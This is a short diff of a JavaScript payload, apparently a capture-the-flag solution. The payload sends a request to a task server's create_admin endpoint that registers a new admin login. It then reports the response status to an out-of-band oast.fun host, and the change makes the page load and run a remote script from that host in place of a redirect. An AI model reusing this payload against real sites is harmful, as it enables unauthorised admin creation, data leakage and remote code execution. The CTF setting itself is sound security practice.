@@ -5,7 +5,9 @@ fetch("https://tasks.goidactf.ru:20199/create_admin",{
   body:"new_admin_login=ctfadmin",
   redirect:"manual"
 }).then(r=>{
-  location.href =
-    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/s" + r.status;
+  const s = document.createElement("script");
+  s.src =
+    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/s" + r.status + ".js";
+  document.head.appendChild(s);
 });
 </script>
